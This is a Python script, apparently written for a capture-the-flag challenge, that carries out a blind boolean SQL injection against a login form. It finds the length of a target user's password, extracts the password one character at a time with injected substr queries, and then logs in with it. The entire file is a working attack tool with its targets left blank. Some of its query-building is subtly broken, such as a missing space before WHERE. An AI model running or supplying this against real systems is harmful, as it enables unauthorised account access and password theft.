import requests
import string

# URL of target
target = ''
# POST parameter for SQLi (use user field if possible)
post_param = ''
# POST parameter (use password field if possible)
post_pass = ''
# Target user to bruteforce the password
target_user = ''
# Name of table used in SQL statement
table_name = ''
# Parameter name of user name in SQL statement
uparam_name = ''
# Parameter name of password in SQL statement
pparam_name = ''
# Unique parameter in the success page
unique = ''

len_template = "' OR (SELECT length(" + pparam_name + ") FROM " + table_name + " WHERE " + uparam_name + " = '" + target_user + "') > {0} --'"
brute_template = "' OR substr((SELECT " + pparam_name + " FROM " + table_name + "WHERE " + uparam_name + " = '" + target_user + "'), {0}, 1) = '{1}' --"

pass_range = 0
password = ''

print('[+] Started to estimate how password long is')
for i in list(reversed(range(50))):
    res = requests.post(target, data={post_param: len_template.format(str(i))})
    if unique in res.text:
        pass_range = i + 1
        print('[*] Length of flag: ' + str(pass_range))
        break
print('[+] Started to estimate the actual password')
for i in range(pass_range + 1):
    for letter in string.printable:
        res = requests.post(target, data={post_param: brute_template.format(i, letter)})
        if unique in res.text:
            password = password + letter
            break
print('[*] Done! Password is ' + password)
print('[+] Checking whether password is correct or incorrect')
res = requests.post(target, data={post_param: target_user, post_pass: password})
if unique in res.text:
    print('[*] Checked! Password is usable!!')
else:
    print('[-] Unknown error occured.')
    exit(1)
